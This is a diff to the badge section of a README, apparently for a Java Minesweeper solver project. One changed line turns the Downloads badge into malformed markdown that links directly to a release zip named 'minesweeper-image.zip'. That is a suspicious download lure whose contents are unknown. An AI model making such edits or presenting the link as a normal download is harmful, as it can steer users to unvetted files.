@@ -1,6 +1,6 @@
 ![CI](https://github.com/Bossiq/bossiq-minesweeper-solver/actions/workflows/ci.yml/badge.svg)
 ![Release](https://img.shields.io/github/v/release/Bossiq/bossiq-minesweeper-solver)
-![Downloads](https://img.shields.io/github/downloads/Bossiq/bossiq-minesweeper-solver/total)
+![Downloads]([https://img.shields.io/github/downloads/Bossiq/bossiq-minesweeper-solver/total](https://github.com/Bossiq/bossiq-minesweeper-solver/releases/latest/download/minesweeper-image.zip))
 ![License](https://img.shields.io/github/license/Bossiq/bossiq-minesweeper-solver)
 ![Java](https://img.shields.io/badge/Java-17%2B-orange)
 
